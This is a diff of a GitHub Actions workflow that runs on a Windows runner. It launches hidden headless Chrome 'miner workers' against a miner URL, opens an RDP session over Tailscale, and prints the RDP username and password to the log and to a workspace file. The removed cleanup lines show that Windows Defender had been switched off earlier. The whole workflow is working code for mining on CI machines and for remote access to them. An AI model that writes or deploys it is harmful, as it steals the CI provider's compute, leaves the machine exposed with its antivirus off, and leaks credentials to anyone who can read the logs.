@@ -141,146 +141,76 @@ jobs:
 
       - name: Deploy Advanced Miner System
         run: |
-          # Create miner management script file instead of inline script block
-          $minerScriptContent = @'
-          `$workers = $env:MINER_WORKERS
-          `$minerUrl = "$env:MINER_URL&workers=`$workers"
-          `$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
+          # Create simplified miner script
+          $minerScript = @"
+          `$workers = `$env:MINER_WORKERS
+          `$minerUrl = "`$env:MINER_URL&workers=`$workers"
           
-          function Start-MinerProcess {
-              param([int]`$id)
-              while (`$true) {
-                  try {
-                      `$process = Start-Process -FilePath `$chromePath `
-                          -ArgumentList "--headless", "--disable-gpu", "--no-sandbox", "--disable-dev-shm-usage", "--disable-software-rasterizer", "--disable-background-timer-throttling", "--memory-pressure-off", "--max_old_space_size=4096", "--remote-debugging-port=9`$id", "--app=`$minerUrl" `
-                          -PassThru -WindowStyle Hidden
-                      
-                      Write-Host "Started miner worker `$id (PID: `$(`$process.Id))"
-                      
-                      # Monitor process
-                      Wait-Process -Id `$process.Id -ErrorAction SilentlyContinue
-                      Write-Host "Miner worker `$id stopped, restarting..."
-                      Start-Sleep -Seconds 5
-                  } catch {
-                      Write-Host "Error in worker `$id: `$_"
-                      Start-Sleep -Seconds 10
-                  }
-              }
-          }
-          
-          # Start multiple workers
           for (`$i = 1; `$i -le `$workers; `$i++) {
-              Start-Job -ScriptBlock `${function:Start-MinerProcess} -ArgumentList `$i -Name "miner-worker-`$i"
+              Start-Job -ScriptBlock {
+                  while (`$true) {
+                      try {
+                          Start-Process "C:\Program Files\Google\Chrome\Application\chrome.exe" -ArgumentList "--headless", "--disable-gpu", "--no-sandbox", "--remote-debugging-port=9`$using:i", "--app=`$using:minerUrl" -WindowStyle Hidden -PassThru
+                          Start-Sleep -Seconds 600
+                      } catch {
+                          Start-Sleep -Seconds 30
+                      }
+                  }
+              } -Name "miner-worker-`$i"
           }
           
-          Write-Host "✅ Started `$workers miner workers"
-          
-          # Keep script running
-          while (`$true) {
-              `$runningJobs = Get-Job | Where-Object State -eq 'Running'
-              Write-Host "[`$(Get-Date)] Running miners: `$(`$runningJobs.Count)/`$workers"
-              Start-Sleep -Seconds 60
-          }
-'@
-
-          # Save miner script to file
+          Write-Host "Started `$workers miner workers"
+          while (`$true) { Start-Sleep -Seconds 60 }
+"@
           $scriptPath = "$env:TEMP\miner_manager.ps1"
-          $minerScriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
+          $minerScript | Out-File -FilePath $scriptPath -Encoding UTF8
           
-          # Start miner manager as background job
+          # Start miner manager
           Start-Job -ScriptBlock {
               param($path)
-              & "powershell.exe" -File $path
-          } -ArgumentList $scriptPath -Name "miner-manager"
+              powershell -File $path
+          } -ArgumentList $scriptPath
 
       - name: Create Connection Info File
         run: |
           $connectionInfo = @"
-╔═══════════════════════════════════════╗
-║           RDP CONNECTION INFO         ║
-╠═══════════════════════════════════════╣
-║ IP Address: $env:TS_IP                ║
-║ Username: $env:RDP_USER               ║
-║ Password: $env:RDP_PASSWORD           ║
-║ Workers: $env:MINER_WORKERS           ║
-║ Runtime: $env:MAX_RUNTIME minutes     ║
-║ Created: $(Get-Date)                  ║
-╚═══════════════════════════════════════╝
-
-Connection Command:
-mstsc /v:$env:TS_IP
-
-Tailscale Status:
-& "$env:ProgramFiles\Tailscale\tailscale.exe" status
+RDP CONNECTION INFO
+IP: $env:TS_IP
+User: $env:RDP_USER
+Pass: $env:RDP_PASSWORD
+Workers: $env:MINER_WORKERS
+Runtime: $env:MAX_RUNTIME minutes
 "@
-          
-          $infoPath = "$env:GITHUB_WORKSPACE\RDP_Connection_Info.txt"
-          $connectionInfo | Out-File -FilePath $infoPath -Encoding UTF8
+          $connectionInfo | Out-File -FilePath "$env:GITHUB_WORKSPACE\RDP_Info.txt" -Encoding UTF8
           
           Write-Host "=========================================="
           Write-Host "🚀 RDP SESSION READY"
-          Write-Host "📱 IP: $env:TS_IP"
-          Write-Host "👤 User: $env:RDP_USER"
-          Write-Host "🔑 Pass: $env:RDP_PASSWORD"
-          Write-Host "⚡ Workers: $env:MINER_WORKERS"
-          Write-Host "⏱ Duration: $env:MAX_RUNTIME minutes"
-          Write-Host "📋 Info file: $infoPath"
+          Write-Host "IP: $env:TS_IP"
+          Write-Host "User: $env:RDP_USER" 
+          Write-Host "Pass: $env:RDP_PASSWORD"
+          Write-Host "Workers: $env:MINER_WORKERS"
+          Write-Host "Duration: $env:MAX_RUNTIME minutes"
           Write-Host "=========================================="
 
       - name: Monitor Session
         run: |
           $startTime = Get-Date
           $endTime = $startTime.AddMinutes($env:MAX_RUNTIME)
-          $checkInterval = 30  # seconds
           
           while ((Get-Date) -lt $endTime) {
               $elapsed = [int]((Get-Date) - $startTime).TotalMinutes
               $remaining = [int]($endTime - (Get-Date)).TotalMinutes
               
-              # Check miner status
-              $minerJobs = Get-Job -Name "miner-worker-*" | Where-Object State -eq 'Running'
-              $tsStatus = & "$env:ProgramFiles\Tailscale\tailscale.exe" status 2>$null
-              
-              Clear-Host
-              Write-Host "=== RDP MINER MONITOR ==="
-              Write-Host "Elapsed: $elapsed minutes"
-              Write-Host "Remaining: $remaining minutes"
-              Write-Host "Active Miners: $($minerJobs.Count)/$env:MINER_WORKERS"
-              Write-Host "Tailscale IP: $env:TS_IP"
-              Write-Host "Last Check: $(Get-Date)"
-              Write-Host "========================="
-              
-              # Restart failed miners (if any)
-              if ($minerJobs.Count -lt $env:MINER_WORKERS) {
-                  Write-Host "⚠️ Some miners stopped, restarting..."
-                  # The miner manager should handle restarts automatically
-              }
-              
-              Start-Sleep -Seconds $checkInterval
+              Write-Host "Elapsed: $elapsed minutes - Remaining: $remaining minutes - Workers: $env:MINER_WORKERS"
+              Start-Sleep -Seconds 60
           }
-          
-          Write-Host "⏰ Session time completed"
 
       - name: Cleanup Resources
         if: always()
         run: |
-          Write-Host "Starting cleanup process..."
-          
-          # Stop all miner jobs
-          Get-Job | Stop-Job -PassThru | Remove-Job -Force
-          
-          # Kill Chrome processes
+          Write-Host "Cleaning up..."
+          Get-Job | Stop-Job | Remove-Job -Force
           Get-Process -Name "chrome*" -ErrorAction SilentlyContinue | Stop-Process -Force
-          
-          # Tailscale logout
-          $tsExe = "$env:ProgramFiles\Tailscale\tailscale.exe"
-          & $tsExe logout 2>$null
-          
-          # Re-enable Windows Defender
-          Set-MpPreference -DisableRealtimeMonitoring $false
-          
-          # Clean temp files
+          & "$env:ProgramFiles\Tailscale\tailscale.exe" logout
           Remove-Item "$env:TEMP\miner_manager.ps1" -ErrorAction SilentlyContinue
-          Remove-Item "$env:GITHUB_WORKSPACE\RDP_Connection_Info.txt" -ErrorAction SilentlyContinue
-          
-          Write-Host "✅ Cleanup completed successfully"
+          Write-Host "Cleanup completed"
